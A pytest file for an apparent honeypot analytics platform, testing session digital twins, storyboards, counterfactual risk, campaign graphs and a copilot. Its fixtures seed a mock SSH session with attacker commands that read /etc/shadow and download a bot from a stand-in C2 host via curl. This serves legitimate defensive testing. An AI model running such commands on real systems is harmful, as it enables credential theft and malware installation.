"""
Comprehensive tests for Standout Research-Grade Cybersecurity Platform Features:
  1. Attack Behavior Digital Twin & Incident Storyboard
  2. Next-Intent Prediction Evaluation against Observed Behavior
  3. Counterfactual Risk Analysis Engine
  4. Attack Campaign Graph Engine
  5. Deception Effectiveness Laboratory
  6. Evidence-First AI Copilot
  7. Concept Drift & Novelty Test API
"""

from datetime import datetime, timezone
from fastapi.testclient import TestClient
import mongomock
import pytest

from backend.app.api.dependencies import get_persistence_service
from backend.app.main import app
from backend.app.models.events import NormalizedEvent
from backend.app.models.features import SessionFeatures
from backend.app.models.intent import AttackStage, IntentCategory
from backend.app.services.campaign_graph import campaign_graph_engine
from backend.app.services.copilot_engine import copilot_engine
from backend.app.services.counterfactual_engine import counterfactual_engine
from backend.app.services.deception_lab import deception_effectiveness_lab
from backend.app.services.digital_twin import digital_twin_engine
from backend.app.services.persistence_service import PersistenceService


@pytest.fixture
def mock_persistence():
    client = mongomock.MongoClient()
    db = client["test_standout_db"]
    svc = PersistenceService(db=db)

    # Seed sample session
    now = datetime.now(timezone.utc)
    sess_doc = {
        "session_id": "sess-twin-01",
        "source_ip": "198.51.100.77",
        "protocol": "ssh",
        "username": "root",
        "first_seen": now,
        "last_seen": now,
        "duration": 45.0,
        "total_events": 4,
        "command_count": 4,
        "unique_commands": ["whoami", "cat /etc/passwd", "cat /etc/shadow", "curl -O http://c2.net/bot"],
        "intent_sequence": ["RECONNAISSANCE", "DISCOVERY", "CREDENTIAL_ACCESS", "EXECUTION"],
        "stage_sequence": ["RECONNAISSANCE", "DISCOVERY", "CREDENTIAL_ACCESS", "EXECUTION"],
        "dominant_intent": "CREDENTIAL_ACCESS",
        "current_attack_stage": "EXECUTION",
        "risk_score": 85,
        "severity": "CRITICAL",
        "is_closed": True,
        "created_at": now,
    }
    db["sessions"].insert_one(sess_doc)

    # Seed events
    events = [
        {
            "event_id": "ev-01",
            "session_id": "sess-twin-01",
            "source_ip": "198.51.100.77",
            "timestamp": now,
            "event_type": "command_input",
            "command": "whoami",
            "intent": "RECONNAISSANCE",
            "attack_stage": "RECONNAISSANCE",
            "risk_score": 10,
            "severity": "LOW",
        },
        {
            "event_id": "ev-02",
            "session_id": "sess-twin-01",
            "source_ip": "198.51.100.77",
            "timestamp": now,
            "event_type": "command_input",
            "command": "cat /etc/passwd",
            "intent": "DISCOVERY",
            "attack_stage": "DISCOVERY",
            "risk_score": 15,
            "severity": "LOW",
        },
        {
            "event_id": "ev-03",
            "session_id": "sess-twin-01",
            "source_ip": "198.51.100.77",
            "timestamp": now,
            "event_type": "command_input",
            "command": "cat /etc/shadow",
            "intent": "CREDENTIAL_ACCESS",
            "attack_stage": "CREDENTIAL_ACCESS",
            "risk_score": 35,
            "severity": "MEDIUM",
        },
        {
            "event_id": "ev-04",
            "session_id": "sess-twin-01",
            "source_ip": "198.51.100.77",
            "timestamp": now,
            "event_type": "command_input",
            "command": "curl -O http://c2.net/bot",
            "intent": "EXECUTION",
            "attack_stage": "EXECUTION",
            "risk_score": 30,
            "severity": "MEDIUM",
        },
    ]
    db["events"].insert_many(events)

    # Seed attacker profile
    db["attackers"].insert_one({
        "source_ip": "198.51.100.77",
        "first_seen": now,
        "last_seen": now,
        "total_sessions": 1,
        "total_events": 4,
        "average_risk": 85.0,
        "maximum_risk": 85,
        "dominant_intent": "CREDENTIAL_ACCESS",
        "current_stage": "EXECUTION",
        "severity": "CRITICAL",
    })

    return svc


@pytest.fixture
def client(mock_persistence):
    app.dependency_overrides[get_persistence_service] = lambda: mock_persistence
    with TestClient(app) as test_client:
        yield test_client
    app.dependency_overrides.clear()


def test_digital_twin_engine_build(mock_persistence):
    sess = mock_persistence.get_session("sess-twin-01")
    events, _ = mock_persistence.get_events(filters={"session_id": "sess-twin-01"})
    twin = digital_twin_engine.build_digital_twin(sess, events)

    assert twin.session_id == "sess-twin-01"
    assert twin.total_steps == 4
    assert len(twin.timeline) == 4
    assert twin.timeline[0].command == "whoami"
    assert twin.timeline[0].step == 1
    assert twin.timeline[-1].step == 4
    assert len(twin.stage_milestones) >= 3
    # Check that predictions were evaluated against subsequent observed events
    assert twin.evaluated_predictions_count == 3
    assert twin.next_intent_accuracy_top3 >= 0.0


def test_incident_storyboard_generation(mock_persistence):
    sess = mock_persistence.get_session("sess-twin-01")
    events, _ = mock_persistence.get_events(filters={"session_id": "sess-twin-01"})
    sb = digital_twin_engine.generate_incident_storyboard(sess, events)

    assert sb.session_id == "sess-twin-01"
    assert sb.source_ip == "198.51.100.77"
    assert sb.overall_severity in ("HIGH", "CRITICAL")
    assert len(sb.narrative_phases) >= 1
    assert len(sb.indicators_of_compromise) >= 1
    assert any(ioc["type"] == "IPv4" and ioc["value"] == "198.51.100.77" for ioc in sb.indicators_of_compromise)


def test_counterfactual_risk_analysis(mock_persistence):
    sess = mock_persistence.get_session("sess-twin-01")
    events, _ = mock_persistence.get_events(filters={"session_id": "sess-twin-01"})

    # Exclude credential access event (ev-03)
    res = counterfactual_engine.simulate_event_exclusion(sess, events, "ev-03")

    assert res.session_id == "sess-twin-01"
    assert res.excluded_event_id == "ev-03"
    assert res.excluded_command == "cat /etc/shadow"
    assert res.original_risk_score == 85
    # Counterfactual risk must be lower than or equal to original
    assert res.counterfactual_risk_score <= res.original_risk_score
    assert res.risk_delta >= 0
    assert "CREDENTIAL_ACCESS" not in res.counterfactual_stages


def test_campaign_graph_generation(mock_persistence):
    sessions, _ = mock_persistence.get_sessions()
    attackers, _ = mock_persistence.get_attackers()
    events, _ = mock_persistence.get_events()

    graph = campaign_graph_engine.build_graph(sessions, attackers, events)

    assert graph.total_nodes > 0
    assert any(n.type == "ip" for n in graph.nodes)
    assert any(n.type == "session" for n in graph.nodes)
    assert len(graph.campaigns) >= 1


def test_evidence_first_copilot(mock_persistence):
    res = copilot_engine.query(
        "What shadow credentials did the attacker target?",
        session_id="sess-twin-01",
        persistence_override=mock_persistence,
    )

    assert res.query != ""
    assert len(res.facts) >= 1
    assert any("cat /etc/shadow" in f.statement for f in res.facts)
    assert any(f.event_id == "ev-03" for f in res.facts)
    assert len(res.uncertainties) >= 1
    assert len(res.hypotheses) >= 1


def test_deception_lab_benchmark():
    report = deception_effectiveness_lab.run_replay_experiment([])

    assert report.total_commands_evaluated > 0
    assert report.adaptive_dwell_time_seconds > report.static_dwell_time_seconds
    assert report.dwell_time_improvement_multiplier > 1.0
    assert report.evasion_resistance_score_adaptive > report.evasion_resistance_score_static


def test_rest_api_standout_endpoints(client):
    # 1. Digital Twin
    r_twin = client.get("/api/sessions/sess-twin-01/digital-twin")
    assert r_twin.status_code == 200
    assert r_twin.json()["session_id"] == "sess-twin-01"
    assert len(r_twin.json()["timeline"]) == 4

    # 2. Storyboard
    r_sb = client.get("/api/sessions/sess-twin-01/storyboard")
    assert r_sb.status_code == 200
    assert r_sb.json()["session_id"] == "sess-twin-01"
    assert len(r_sb.json()["narrative_phases"]) >= 1

    # 3. Counterfactual
    r_cf = client.post("/api/sessions/sess-twin-01/counterfactual", json={"excluded_event_id": "ev-03"})
    assert r_cf.status_code == 200
    assert r_cf.json()["excluded_event_id"] == "ev-03"
    assert r_cf.json()["risk_delta"] >= 0

    # 4. Campaign Graph
    r_cg = client.get("/api/analytics/campaign-graph")
    assert r_cg.status_code == 200
    assert r_cg.json()["total_nodes"] > 0

    # 5. Deception Lab Benchmark
    r_lab = client.get("/api/deception/lab/benchmark")
    assert r_lab.status_code == 200
    assert r_lab.json()["dwell_time_improvement_multiplier"] > 1.0

    # 6. Copilot Query
    r_cp = client.post("/api/research/copilot/query", json={"query": "Summary of events", "session_id": "sess-twin-01"})
    assert r_cp.status_code == 200
    assert "answer" in r_cp.json()
    assert len(r_cp.json()["facts"]) >= 1

    # 7. Drift Test Command
    r_drift = client.post("/api/analytics/drift/test-command", json={"command": "cat /etc/shadow"})
    assert r_drift.status_code == 200
    assert "predicted_intent" in r_drift.json()
